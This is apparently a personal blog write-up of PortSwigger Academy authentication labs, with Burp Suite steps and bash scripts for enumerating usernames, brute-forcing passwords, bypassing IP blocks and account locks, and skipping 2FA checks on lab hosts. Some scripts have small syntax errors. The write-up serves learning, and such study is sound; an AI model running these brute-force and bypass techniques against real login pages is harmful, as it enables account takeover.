---
layout: post
title: Portswigger Academy - Authentication
date: 2023-06-19 20:39:23 +0200
categories: [Portswigger Academy, Server-Side Topics]
tags: [Authentication, Write-up]
img_path: /assets/img/labs/portswigger/authentication/
image:
  path: authentication.jpg
---

## Info

This is my write-up for the *Authentication* learning path at the Portswigger Academy.\
The reason for this write-up is to have a cheat-sheet or some go-to notes for myself.\
Probably I've found flags in a different way than intended (with or without the use of BurpSuite), and not always in the order of learning path.


## Lab : Username enumeration via different responses

* Navigate to the login screen.
* Try to log in with *test / test* and intercept the request via BurpSuite.
* Send the request to intruder.
* Make a payload for the username only:\
`username=§test§&password=test`
* Set load the sample usernames from the lab as the payload.
* Start the attack.

This will send a request to the login function with all the different possible usernames as the *username*.\
Note the response info for each request. All of them have the exact same size, except for 1 username. This is the username we are looking for.

* Go back intruder, and fill-in that username you just found\
`username=<my-found-username>&password=test`
* Set a payload for the password field\
`username=<my-found-username>&password=§test§`
* Go to the payload tab, and clear the payloads.
* Add the sample usernames from the lab as the possible payloads.
* Start the attack.

Similar as before, it will now try to login with that found username, and every possible password from the list.\
Again, one of the requests has a different size in the response; this is the password you are looking for.

Login on the website with that found username and password.


## LAB : Username enumeration via subtly different resonses.

Running the exact same test as the previous lab didn't work. There were differences in sizes for a lot of responses.

However, as the title mentions, there must be a subtle difference in the response of the correct username. Probably there is something different in the warning message. This could be a difference in the capitalization of a word, or a change in punctuation, an extra space, or ...

I solved this lab in 2 different ways. First of, good old bash:
```bash
#!/bin/bash

URL="https://xxxxxxxx.web-security-academy.net/login"
WORDLIST="/usr/share/wordlists/portswigger/portswigger-usernames.txt" # It's where I saved the sample wordlist

#Let's first get a baseline for the warning message. I'll use a username and password that I know won't work and throw the warning message.
baseline=$(wget --post-data "username=test&password=test" ${URL} -qO- | grep "is-warning")

for username in $(cat ${WORDLIST}); do
   
   # Get the warning message when using this username
   chk=$(wget --post-data "username=${username}&password=test ${URL} -qO- | grep "is-warning")

   # Check if this warning message is exactly the same as our baseline warning message
   if [[ "${chk}" != "${baseline}" ]]; then
      echo $username
   fi
done
```
{: .nolineno }

> I didn't do a break in the *if* statement, because maybe there are multiple valid usernames.
{: .prompt-info }

This script gave me a single username. And looking at the response from using this username, it was indeed clear that there was no dot at the end of the warning message.

Continue to brute-force the password. This can be done with intruder again, just like the previous lab.

Login with the found username and password to solve the lab.


## LAB : Username enumeration via response timing

Trying the same as in the previous two labs didn't work. It even blocked my IP after a handful (5) tries.\
When I added a header `X-Forwarded-For: 192.168.0.1` to the request, it worked again for 5 more tries. Increasing the IP-address's last octed gave me another 5 attempts. \
So I was able to do unlimited attempts, if I just keep changing the header's IP address.

The title of the lab indicated an exploit using a response timing. So I had to find a way to see if the response time was longer under certain conditions.\
And we have some valid credentials.

Using the first request in repeater, and using the known credential as input for the login form, I tried several tests.\
It became clear, if I used the known username and a wrong password, the response time increased if the length of the wrong password also increased.

I sent the request to intruder, and used the pitchfork attack type.\
Adding a payload to both the *X-Forwarded-For IP address* as well as the *username* post-data.\
Running the attack with the sample username list, and making sure the response time column was shown in the results.\
Some (5-ish) usernames gave a longer response time than most others. So I ran this test 3 times. And only 1 username gave a longer response time during all 3 tests. This was the username I needed.

Brute-forcing the password was once again done in the same way as previous labs. But make sure to add the *X-Forwarded-For* header and change it every 5 attempts.

Login with the found username and password to solve the lab.


## LAB : Broken brute-force protection, IP block

We have a valid credential, and another valid username.\
Doing some basic tests with this info:
* Log in with *wiener / peter* works.
* Log in with *carlos / test* fails.
* Trying multiple log ins with *carlos* gives me a 1 minute IP-block.
* Using the *X-Forwarded-For* header doesn't bypass this block.
* Log in again with *wiener / peter* doesn't lift the block.
* Waiting 1 minute for the block to pass.
* Attempt to log in with *carlos* twice, then with *wiener / peter*, then again twice with *carlos* doesn't give a block.

This means we can do unlimited attempts for the user *carlos* as long as we login with *wiener / peter* after every 2 attempts.

This could be done with BurpSuite, but creating a username list containing 'carlos carlos wiener carlos carlos wiener ...' and a password list with the sample passwords, and inject 'peter' after every 2 sample passwords.\
Then use the clusterbomb attack type.

However, I did it using a small bash script.
```bash
#!/bin/bash

HOST="https://xxxxxxxx.web-security-academy.net"
WORDLIST="/usr/share/wordlists/portswigger/portswigger-passwords.txt"

i=0
echo
for pw in $(cat ${WORDLIST}); do
   # Try to login as carlos with a password from the sample list
   status=$(wget --post-data "username=carlos&password=${pw}" ${HOST}/login -qO- | grep "Incorrect password")
   if [[ "${status}" == "" ]]; then
     echo ${pw}
     break
   fi

   # Login as wiener / peter every 2 attempts.
   let i=${i}+1
   if [[ ${i} -ge 2 ]]; then # Should never be greater than 2, but better safe.
      wget --post-data "username=wiener&password=peter" ${HOST}/login -qO- > /dev/null
      i=0
   fi
done
echo
echo
```
{: .nolineno }

And this script gives the password for the *carlos* user. Login with the credentials on the website to solve the lab.


## LAB : Username enumeration via account lock

Trying the same as the previous lab, but with no valid usernames. Both wiener and carlos don't trigger a block.\
Probably the same max tries of 3 is in place, so I build a script that tries each username 5 times. And if it gets a *too many attempts* error, we hit a valid username.

```bash
#!/bin/bash

URL="https://xxxxxxxx.web-security-academy.net/login"
USERNAMELIST="/usr/share/wordlists/portswigger/portswigger-usernames.txt"
PWDLIST="/usr/share/wordlists/portswigger/portswigger-passwords.txt"

username=""
for user in $(cat ${USERNAMELIST}); do
   i=0
   while [[ ${i} -lt 5 ]]; do
      let i=${i}+1

      # Trying to login with a random password for each username 5 times. Hoping it would lock a user if it exists.
      chk=$(wget --post-data "username=${user}&password=test" ${URL} -qO- | grep "too many incorrect login attempts")

      if [[ "${chk}" != "" ]]; then
        username=${user}
        break 2
      fi
   done
done
echo
${username}
echo
echo
```
{: .nolineno }


Executing this script provided us with a username. Manually trying to login to the website with this username a few times verified that it was indeed a valid user and gets blocked.

To brute-force the password, we can't do the same as previous lab, as we don't have a valid credential to reset the attempt counter.\
I even tried to run the above script with only a *level 1 break* in the IF-statement. This keeps the script running after it finds a username. And this showed that there is only 1 valid username.

That means we have to wait 60 seconds between every 2 attempts?\
While it would take some time, it is doable in this lab where we only have 100 possible passwords. It would not be possible in a real scenario.

Before we try that, let's see if all passwords generate the same warning message. Without a wait in between different attempts:
```bash
#!/bin/bash

URL=...
USERNAMELIST=...
PWDLIST=...

### The username brute-force script from above ###

echo
echo "Found a valid username: ${username}
echo "Checking all passwords on this username without waiting"

for pw in $(cat ${PWDLIST})); do
   
   # See how many characters the warning line is when we get to many attempts.
   chk=$(wget --post-data "username=${username}&password=${pw}" ${URL} -qO- | grep "is-warning" | wc -m)

   # I tried this a few times, and the 'too many attempts' error is 130 characters.
   # So let's see if a certain password triggers something else.
   if [[ ${chk} -ne 130 ]]; then
      echo ${pw}
   fi

done
echo
echo
```
{: .nolineno}

And this script showed that there was 1 password that didn't give an error at all.

Wait for 1 minute, and log in on the website with the found username and password to solve the lab.

> This can also be solved with burpsuite:
* Find the username:
  * Perform a clusterbomb attack with 5 tries for each username:\
  `password=test§§&username=§user§`\
  (I had to swap the order of the password and username, otherwise it would try every password first and then repeat the whole list for 5 times, which takes too much time to trigger the lock-out )
    * 1st set of payload: null; with 5 attempts
    * 2nd set of payload: username list
* Find the password:
  * Perform a sniper attack with a regex grep-extract
{: .prompt-info}

## LAB: Broken brute-force protection, multiple credentials per request

We only have a valid username 'carlos'.\
And as the title says, we need to be able to check multiple credentials per request.\
Same as previous labs, if we try a random password and attempt to login as carlos multiple times, we are locked out for 1 minute.

Capturing the login request via Burp, and we can see that there is something different than in other labs.\
The post-data is not just `username=carlos&password=test`, but it's in a json object format:
```json
{
   "username": "carlos",
   "password": "test"
}
```
{: .nolineno}

This info, together with the hint in the title, points me towards using an array of passwords or an array of usernames/passwords instead of a single username/password.\
I first wanted to check if this worked or not, by passing this as the post-data:
```json
{
   "username": "carlos",
   "password": [
      "password1",
      "password2",
      "password3"
   ]
}
```
{: .nolineno}
Which at least didn't gave an error, so that's worth a shot.

Wrote a little script that generated the payload:
```bash
#!/bin/bash

PWFILE="/usr/share/wordlists/portswigger/portswigger-passwords.txt"


echo '{'
echo '  "username": "carlos",'
echo '  "password": [ '
for pw in $(cat ${PWFILE}); do
  echo "    \"${pw}\","
done
echo '    "test"'
echo '  ]'
echo '}'
```
{:. nolineno}

And then intercepted a new login attempt with Burp, changed the payload to the output of this script, and forwarded it to the browser.\
Lab solved.


## LAB : 2FA simple bypass

We are presented with 2 valid credentials: mine (wiener / peter) and the victim (carlos / montoya).\
Trying to login with my credentials, it asks for a 4 digit code, which we don't have. Trying *1234* fails, and brings us back to the login page.

Trying to login with the victims credentials asks for the same 4 digit code.\
However, when you just return to the main page (removing the */login2* part of the url) and going to myaccount, will show that you are actually logged in as carlos.\
Lab solved.


## LAB : 2FA broken logic

We are presented with our own valid credentials (wiener / peter) and the victim's username (carlos).\
Secondly, we also have access to the e-mail server where the MFA codes are being send to.

My first several attempts were to login as *wiener*, get the MFA code, and use that code but change the request from *verify=wiener* to *verify=carlos*, but none of those attempts worked.\
After many failed attempts, I figured this access to the e-mail server was just a rabbithole.

The next attempt was to login as *wiener*, and then capture the MFA code input request. Since I had to intrude a big payload I jused caido this time, as I don't have the paid version of burpsuite, and large intruder payloads just take ages in the community version.\
Again, change the cookie in the request from *verifiy=wiener* to *verify=carlos*, and sent the request to automate.\
I created a wordlist with numbers 0000 to 9999, and used this as payload in caido.

1 request had a different status code, so this was the MFA code that I was looking for.\
I captured another MFA code input request, this time in burp, and changed the cookie and the MFA code, and forwarded the request to the browser.

It showed that I was logged in as carlos, but not lab solved.\
Just going to *my account* solved the lab.





## Credits

Header image by [freepik](https://www.freepik.com/free-vector/gradient-ssl-illustration_22112339.htm)

